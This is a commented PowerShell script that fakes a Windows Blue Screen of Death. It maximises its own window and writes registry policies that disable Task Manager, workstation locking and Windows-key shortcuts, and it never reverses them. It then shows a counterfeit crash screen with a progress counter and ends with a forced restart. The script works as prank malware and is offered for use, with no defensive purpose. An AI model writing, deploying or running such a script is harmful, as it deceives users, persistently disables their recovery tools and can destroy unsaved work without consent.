# This PowerShell script simulates a full-screen Blue Screen of Death (BSOD) by 
# disabling common keyboard shortcuts and displaying a convincing error screen with a progress counter.

# Create a WScript.Shell COM object to send keystrokes for minimizing open windows
$wshell = New-Object -ComObject WScript.Shell
$wshell.SendKeys('^{ESC}')  # Simulate pressing Ctrl+Esc to minimize windows
Start-Sleep -Seconds 1
$wshell.SendKeys('^{ESC}')  # Repeat to ensure focus is removed from other windows

# Import C# code to enable full-screen window manipulation (setting foreground and maximizing)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Screen {
    [DllImport("user32.dll")]
    public static extern int SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
}
"@

# Get the current process' main window handle and force it to full-screen and the foreground
$ps = (Get-Process -Id $pid).MainWindowHandle
[Screen]::ShowWindowAsync($ps, 3)  # 3: SW_MAXIMIZE, sets the window to maximized mode
[Screen]::SetForegroundWindow($ps)

# Disable system shortcuts by creating registry keys/values:
# - Disable Task Manager
# - Disable workstation locking
# - Disable Windows key shortcuts
$null = New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableLockWorkstation" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoWinKeys" -Value 1

# Clear the PowerShell host display and begin rendering the fake BSOD text.
Clear-Host
Write-Host "`n`n`n`n`n`n" -ForegroundColor Blue
Write-Host "  :(" -ForegroundColor Blue
Write-Host "  Your PC ran into a problem and needs to restart." -ForegroundColor Blue
Write-Host "  We're just collecting some error info, and then we'll restart for you." -ForegroundColor Blue
Write-Host "  If you'd like to know more, you can search online later for this error:" -ForegroundColor Blue
Write-Host "  CRITICAL_PROCESS_DIED" -ForegroundColor Blue

# Display a fake QR code URL for added realism
Write-Host "`n`n  For more information, visit:" -ForegroundColor Blue
Write-Host "  https://www.windows.com/stopcode" -ForegroundColor Blue

# Begin the fake progress counter, simulating error data collection
Write-Host "`n  Collecting error info: 0% complete" -ForegroundColor Blue
Start-Sleep -Seconds 5
for ($i = 1; $i -le 100; $i++) {
    Clear-Host
    Write-Host "`n`n`n`n`n`n" -ForegroundColor Blue
    Write-Host "  :(" -ForegroundColor Blue
    Write-Host "  Your PC ran into a problem and needs to restart." -ForegroundColor Blue
    Write-Host "  We're just collecting some error info, and then we'll restart for you." -ForegroundColor Blue
    Write-Host "  If you'd like to know more, you can search online later for this error:" -ForegroundColor Blue
    Write-Host "  CRITICAL_PROCESS_DIED" -ForegroundColor Blue
    Write-Host "`n`n  For more information, visit:" -ForegroundColor Blue
    Write-Host "  https://www.windows.com/stopcode" -ForegroundColor Blue
    Write-Host "`n  Collecting error info: $i% complete" -ForegroundColor Blue
    Start-Sleep -Milliseconds 100
}

# Optionally simulate a system restart once the progress reaches 100%
Restart-Computer -Force
